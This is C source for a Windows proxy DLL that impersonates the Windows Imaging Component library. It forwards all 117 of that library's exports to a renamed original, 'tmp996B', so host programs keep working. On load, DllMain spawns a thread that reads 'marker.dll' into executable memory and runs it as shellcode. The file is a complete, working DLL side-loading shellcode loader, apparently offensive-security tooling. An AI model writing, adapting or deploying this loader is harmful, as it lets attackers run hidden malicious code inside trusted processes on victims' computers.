
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:DllCanUnloadNow=tmp996B.DllCanUnloadNow,@1")
#pragma comment(linker, "/export:DllFreeCodecResources=tmp996B.DllFreeCodecResources,@2")
#pragma comment(linker, "/export:DllGetClassObject=tmp996B.DllGetClassObject,@3")
#pragma comment(linker, "/export:IEnumString_Next_WIC_Proxy=tmp996B.IEnumString_Next_WIC_Proxy,@4")
#pragma comment(linker, "/export:IEnumString_Reset_WIC_Proxy=tmp996B.IEnumString_Reset_WIC_Proxy,@5")
#pragma comment(linker, "/export:IPropertyBag2_Write_Proxy=tmp996B.IPropertyBag2_Write_Proxy,@6")
#pragma comment(linker, "/export:IWICBitmapClipper_Initialize_Proxy=tmp996B.IWICBitmapClipper_Initialize_Proxy,@7")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_DoesSupportAnimation_Proxy=tmp996B.IWICBitmapCodecInfo_DoesSupportAnimation_Proxy,@8")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_DoesSupportLossless_Proxy=tmp996B.IWICBitmapCodecInfo_DoesSupportLossless_Proxy,@9")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_DoesSupportMultiframe_Proxy=tmp996B.IWICBitmapCodecInfo_DoesSupportMultiframe_Proxy,@10")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_GetContainerFormat_Proxy=tmp996B.IWICBitmapCodecInfo_GetContainerFormat_Proxy,@11")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_GetDeviceManufacturer_Proxy=tmp996B.IWICBitmapCodecInfo_GetDeviceManufacturer_Proxy,@12")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_GetDeviceModels_Proxy=tmp996B.IWICBitmapCodecInfo_GetDeviceModels_Proxy,@13")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_GetFileExtensions_Proxy=tmp996B.IWICBitmapCodecInfo_GetFileExtensions_Proxy,@14")
#pragma comment(linker, "/export:IWICBitmapCodecInfo_GetMimeTypes_Proxy=tmp996B.IWICBitmapCodecInfo_GetMimeTypes_Proxy,@15")
#pragma comment(linker, "/export:IWICBitmapDecoder_CopyPalette_Proxy=tmp996B.IWICBitmapDecoder_CopyPalette_Proxy,@16")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetColorContexts_Proxy=tmp996B.IWICBitmapDecoder_GetColorContexts_Proxy,@17")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetDecoderInfo_Proxy=tmp996B.IWICBitmapDecoder_GetDecoderInfo_Proxy,@18")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetFrameCount_Proxy=tmp996B.IWICBitmapDecoder_GetFrameCount_Proxy,@19")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetFrame_Proxy=tmp996B.IWICBitmapDecoder_GetFrame_Proxy,@20")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetMetadataQueryReader_Proxy=tmp996B.IWICBitmapDecoder_GetMetadataQueryReader_Proxy,@21")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetPreview_Proxy=tmp996B.IWICBitmapDecoder_GetPreview_Proxy,@22")
#pragma comment(linker, "/export:IWICBitmapDecoder_GetThumbnail_Proxy=tmp996B.IWICBitmapDecoder_GetThumbnail_Proxy,@23")
#pragma comment(linker, "/export:IWICBitmapEncoder_Commit_Proxy=tmp996B.IWICBitmapEncoder_Commit_Proxy,@24")
#pragma comment(linker, "/export:IWICBitmapEncoder_CreateNewFrame_Proxy=tmp996B.IWICBitmapEncoder_CreateNewFrame_Proxy,@25")
#pragma comment(linker, "/export:IWICBitmapEncoder_GetEncoderInfo_Proxy=tmp996B.IWICBitmapEncoder_GetEncoderInfo_Proxy,@26")
#pragma comment(linker, "/export:IWICBitmapEncoder_GetMetadataQueryWriter_Proxy=tmp996B.IWICBitmapEncoder_GetMetadataQueryWriter_Proxy,@27")
#pragma comment(linker, "/export:IWICBitmapEncoder_Initialize_Proxy=tmp996B.IWICBitmapEncoder_Initialize_Proxy,@28")
#pragma comment(linker, "/export:IWICBitmapEncoder_SetPalette_Proxy=tmp996B.IWICBitmapEncoder_SetPalette_Proxy,@29")
#pragma comment(linker, "/export:IWICBitmapEncoder_SetThumbnail_Proxy=tmp996B.IWICBitmapEncoder_SetThumbnail_Proxy,@30")
#pragma comment(linker, "/export:IWICBitmapFlipRotator_Initialize_Proxy=tmp996B.IWICBitmapFlipRotator_Initialize_Proxy,@31")
#pragma comment(linker, "/export:IWICBitmapFrameDecode_GetColorContexts_Proxy=tmp996B.IWICBitmapFrameDecode_GetColorContexts_Proxy,@32")
#pragma comment(linker, "/export:IWICBitmapFrameDecode_GetMetadataQueryReader_Proxy=tmp996B.IWICBitmapFrameDecode_GetMetadataQueryReader_Proxy,@33")
#pragma comment(linker, "/export:IWICBitmapFrameDecode_GetThumbnail_Proxy=tmp996B.IWICBitmapFrameDecode_GetThumbnail_Proxy,@34")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_Commit_Proxy=tmp996B.IWICBitmapFrameEncode_Commit_Proxy,@35")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_GetMetadataQueryWriter_Proxy=tmp996B.IWICBitmapFrameEncode_GetMetadataQueryWriter_Proxy,@36")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_Initialize_Proxy=tmp996B.IWICBitmapFrameEncode_Initialize_Proxy,@37")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_SetColorContexts_Proxy=tmp996B.IWICBitmapFrameEncode_SetColorContexts_Proxy,@38")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_SetResolution_Proxy=tmp996B.IWICBitmapFrameEncode_SetResolution_Proxy,@39")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_SetSize_Proxy=tmp996B.IWICBitmapFrameEncode_SetSize_Proxy,@40")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_SetThumbnail_Proxy=tmp996B.IWICBitmapFrameEncode_SetThumbnail_Proxy,@41")
#pragma comment(linker, "/export:IWICBitmapFrameEncode_WriteSource_Proxy=tmp996B.IWICBitmapFrameEncode_WriteSource_Proxy,@42")
#pragma comment(linker, "/export:IWICBitmapLock_GetDataPointer_STA_Proxy=tmp996B.IWICBitmapLock_GetDataPointer_STA_Proxy,@43")
#pragma comment(linker, "/export:IWICBitmapLock_GetStride_Proxy=tmp996B.IWICBitmapLock_GetStride_Proxy,@44")
#pragma comment(linker, "/export:IWICBitmapScaler_Initialize_Proxy=tmp996B.IWICBitmapScaler_Initialize_Proxy,@45")
#pragma comment(linker, "/export:IWICBitmapSource_CopyPalette_Proxy=tmp996B.IWICBitmapSource_CopyPalette_Proxy,@46")
#pragma comment(linker, "/export:IWICBitmapSource_CopyPixels_Proxy=tmp996B.IWICBitmapSource_CopyPixels_Proxy,@47")
#pragma comment(linker, "/export:IWICBitmapSource_GetPixelFormat_Proxy=tmp996B.IWICBitmapSource_GetPixelFormat_Proxy,@48")
#pragma comment(linker, "/export:IWICBitmapSource_GetResolution_Proxy=tmp996B.IWICBitmapSource_GetResolution_Proxy,@49")
#pragma comment(linker, "/export:IWICBitmapSource_GetSize_Proxy=tmp996B.IWICBitmapSource_GetSize_Proxy,@50")
#pragma comment(linker, "/export:IWICBitmap_Lock_Proxy=tmp996B.IWICBitmap_Lock_Proxy,@51")
#pragma comment(linker, "/export:IWICBitmap_SetPalette_Proxy=tmp996B.IWICBitmap_SetPalette_Proxy,@52")
#pragma comment(linker, "/export:IWICBitmap_SetResolution_Proxy=tmp996B.IWICBitmap_SetResolution_Proxy,@53")
#pragma comment(linker, "/export:IWICColorContext_InitializeFromMemory_Proxy=tmp996B.IWICColorContext_InitializeFromMemory_Proxy,@54")
#pragma comment(linker, "/export:IWICComponentFactory_CreateMetadataWriterFromReader_Proxy=tmp996B.IWICComponentFactory_CreateMetadataWriterFromReader_Proxy,@55")
#pragma comment(linker, "/export:IWICComponentFactory_CreateQueryWriterFromBlockWriter_Proxy=tmp996B.IWICComponentFactory_CreateQueryWriterFromBlockWriter_Proxy,@56")
#pragma comment(linker, "/export:IWICComponentInfo_GetAuthor_Proxy=tmp996B.IWICComponentInfo_GetAuthor_Proxy,@57")
#pragma comment(linker, "/export:IWICComponentInfo_GetCLSID_Proxy=tmp996B.IWICComponentInfo_GetCLSID_Proxy,@58")
#pragma comment(linker, "/export:IWICComponentInfo_GetFriendlyName_Proxy=tmp996B.IWICComponentInfo_GetFriendlyName_Proxy,@59")
#pragma comment(linker, "/export:IWICComponentInfo_GetSpecVersion_Proxy=tmp996B.IWICComponentInfo_GetSpecVersion_Proxy,@60")
#pragma comment(linker, "/export:IWICComponentInfo_GetVersion_Proxy=tmp996B.IWICComponentInfo_GetVersion_Proxy,@61")
#pragma comment(linker, "/export:IWICFastMetadataEncoder_Commit_Proxy=tmp996B.IWICFastMetadataEncoder_Commit_Proxy,@62")
#pragma comment(linker, "/export:IWICFastMetadataEncoder_GetMetadataQueryWriter_Proxy=tmp996B.IWICFastMetadataEncoder_GetMetadataQueryWriter_Proxy,@63")
#pragma comment(linker, "/export:IWICFormatConverter_Initialize_Proxy=tmp996B.IWICFormatConverter_Initialize_Proxy,@64")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapClipper_Proxy=tmp996B.IWICImagingFactory_CreateBitmapClipper_Proxy,@65")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapFlipRotator_Proxy=tmp996B.IWICImagingFactory_CreateBitmapFlipRotator_Proxy,@66")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapFromHBITMAP_Proxy=tmp996B.IWICImagingFactory_CreateBitmapFromHBITMAP_Proxy,@67")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapFromHICON_Proxy=tmp996B.IWICImagingFactory_CreateBitmapFromHICON_Proxy,@68")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapFromMemory_Proxy=tmp996B.IWICImagingFactory_CreateBitmapFromMemory_Proxy,@69")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapFromSource_Proxy=tmp996B.IWICImagingFactory_CreateBitmapFromSource_Proxy,@70")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmapScaler_Proxy=tmp996B.IWICImagingFactory_CreateBitmapScaler_Proxy,@71")
#pragma comment(linker, "/export:IWICImagingFactory_CreateBitmap_Proxy=tmp996B.IWICImagingFactory_CreateBitmap_Proxy,@72")
#pragma comment(linker, "/export:IWICImagingFactory_CreateComponentInfo_Proxy=tmp996B.IWICImagingFactory_CreateComponentInfo_Proxy,@73")
#pragma comment(linker, "/export:IWICImagingFactory_CreateDecoderFromFileHandle_Proxy=tmp996B.IWICImagingFactory_CreateDecoderFromFileHandle_Proxy,@74")
#pragma comment(linker, "/export:IWICImagingFactory_CreateDecoderFromFilename_Proxy=tmp996B.IWICImagingFactory_CreateDecoderFromFilename_Proxy,@75")
#pragma comment(linker, "/export:IWICImagingFactory_CreateDecoderFromStream_Proxy=tmp996B.IWICImagingFactory_CreateDecoderFromStream_Proxy,@76")
#pragma comment(linker, "/export:IWICImagingFactory_CreateEncoder_Proxy=tmp996B.IWICImagingFactory_CreateEncoder_Proxy,@77")
#pragma comment(linker, "/export:IWICImagingFactory_CreateFastMetadataEncoderFromDecoder_Proxy=tmp996B.IWICImagingFactory_CreateFastMetadataEncoderFromDecoder_Proxy,@78")
#pragma comment(linker, "/export:IWICImagingFactory_CreateFastMetadataEncoderFromFrameDecode_Proxy=tmp996B.IWICImagingFactory_CreateFastMetadataEncoderFromFrameDecode_Proxy,@79")
#pragma comment(linker, "/export:IWICImagingFactory_CreateFormatConverter_Proxy=tmp996B.IWICImagingFactory_CreateFormatConverter_Proxy,@80")
#pragma comment(linker, "/export:IWICImagingFactory_CreatePalette_Proxy=tmp996B.IWICImagingFactory_CreatePalette_Proxy,@81")
#pragma comment(linker, "/export:IWICImagingFactory_CreateQueryWriterFromReader_Proxy=tmp996B.IWICImagingFactory_CreateQueryWriterFromReader_Proxy,@82")
#pragma comment(linker, "/export:IWICImagingFactory_CreateQueryWriter_Proxy=tmp996B.IWICImagingFactory_CreateQueryWriter_Proxy,@83")
#pragma comment(linker, "/export:IWICImagingFactory_CreateStream_Proxy=tmp996B.IWICImagingFactory_CreateStream_Proxy,@84")
#pragma comment(linker, "/export:IWICMetadataBlockReader_GetCount_Proxy=tmp996B.IWICMetadataBlockReader_GetCount_Proxy,@85")
#pragma comment(linker, "/export:IWICMetadataBlockReader_GetReaderByIndex_Proxy=tmp996B.IWICMetadataBlockReader_GetReaderByIndex_Proxy,@86")
#pragma comment(linker, "/export:IWICMetadataQueryReader_GetContainerFormat_Proxy=tmp996B.IWICMetadataQueryReader_GetContainerFormat_Proxy,@87")
#pragma comment(linker, "/export:IWICMetadataQueryReader_GetEnumerator_Proxy=tmp996B.IWICMetadataQueryReader_GetEnumerator_Proxy,@88")
#pragma comment(linker, "/export:IWICMetadataQueryReader_GetLocation_Proxy=tmp996B.IWICMetadataQueryReader_GetLocation_Proxy,@89")
#pragma comment(linker, "/export:IWICMetadataQueryReader_GetMetadataByName_Proxy=tmp996B.IWICMetadataQueryReader_GetMetadataByName_Proxy,@90")
#pragma comment(linker, "/export:IWICMetadataQueryWriter_RemoveMetadataByName_Proxy=tmp996B.IWICMetadataQueryWriter_RemoveMetadataByName_Proxy,@91")
#pragma comment(linker, "/export:IWICMetadataQueryWriter_SetMetadataByName_Proxy=tmp996B.IWICMetadataQueryWriter_SetMetadataByName_Proxy,@92")
#pragma comment(linker, "/export:IWICPalette_GetColorCount_Proxy=tmp996B.IWICPalette_GetColorCount_Proxy,@93")
#pragma comment(linker, "/export:IWICPalette_GetColors_Proxy=tmp996B.IWICPalette_GetColors_Proxy,@94")
#pragma comment(linker, "/export:IWICPalette_GetType_Proxy=tmp996B.IWICPalette_GetType_Proxy,@95")
#pragma comment(linker, "/export:IWICPalette_HasAlpha_Proxy=tmp996B.IWICPalette_HasAlpha_Proxy,@96")
#pragma comment(linker, "/export:IWICPalette_InitializeCustom_Proxy=tmp996B.IWICPalette_InitializeCustom_Proxy,@97")
#pragma comment(linker, "/export:IWICPalette_InitializeFromBitmap_Proxy=tmp996B.IWICPalette_InitializeFromBitmap_Proxy,@98")
#pragma comment(linker, "/export:IWICPalette_InitializeFromPalette_Proxy=tmp996B.IWICPalette_InitializeFromPalette_Proxy,@99")
#pragma comment(linker, "/export:IWICPalette_InitializePredefined_Proxy=tmp996B.IWICPalette_InitializePredefined_Proxy,@100")
#pragma comment(linker, "/export:IWICPixelFormatInfo_GetBitsPerPixel_Proxy=tmp996B.IWICPixelFormatInfo_GetBitsPerPixel_Proxy,@101")
#pragma comment(linker, "/export:IWICPixelFormatInfo_GetChannelCount_Proxy=tmp996B.IWICPixelFormatInfo_GetChannelCount_Proxy,@102")
#pragma comment(linker, "/export:IWICPixelFormatInfo_GetChannelMask_Proxy=tmp996B.IWICPixelFormatInfo_GetChannelMask_Proxy,@103")
#pragma comment(linker, "/export:IWICStream_InitializeFromIStream_Proxy=tmp996B.IWICStream_InitializeFromIStream_Proxy,@104")
#pragma comment(linker, "/export:IWICStream_InitializeFromMemory_Proxy=tmp996B.IWICStream_InitializeFromMemory_Proxy,@105")
#pragma comment(linker, "/export:WICConvertBitmapSource=tmp996B.WICConvertBitmapSource,@106")
#pragma comment(linker, "/export:WICCreateBitmapFromSection=tmp996B.WICCreateBitmapFromSection,@107")
#pragma comment(linker, "/export:WICCreateBitmapFromSectionEx=tmp996B.WICCreateBitmapFromSectionEx,@108")
#pragma comment(linker, "/export:WICCreateColorContext_Proxy=tmp996B.WICCreateColorContext_Proxy,@109")
#pragma comment(linker, "/export:WICCreateImagingFactory_Proxy=tmp996B.WICCreateImagingFactory_Proxy,@110")
#pragma comment(linker, "/export:WICGetMetadataContentSize=tmp996B.WICGetMetadataContentSize,@111")
#pragma comment(linker, "/export:WICMapGuidToShortName=tmp996B.WICMapGuidToShortName,@112")
#pragma comment(linker, "/export:WICMapSchemaToName=tmp996B.WICMapSchemaToName,@113")
#pragma comment(linker, "/export:WICMapShortNameToGuid=tmp996B.WICMapShortNameToGuid,@114")
#pragma comment(linker, "/export:WICMatchMetadataContent=tmp996B.WICMatchMetadataContent,@115")
#pragma comment(linker, "/export:WICSerializeMetadataContent=tmp996B.WICSerializeMetadataContent,@116")
#pragma comment(linker, "/export:WICSetEncoderFormat_Proxy=tmp996B.WICSetEncoderFormat_Proxy,@117")


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
	//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen("marker.dll", "rb");
	fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);
	
	//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
        fread(buffer, size, 1, fp);

        void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        memcpy(exec, buffer, size);

        ((void(*) ())exec)();

	return 0;
}

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        HANDLE threadHandle;

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH:
		// https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
                threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
                CloseHandle(threadHandle);

            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
            case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
    }



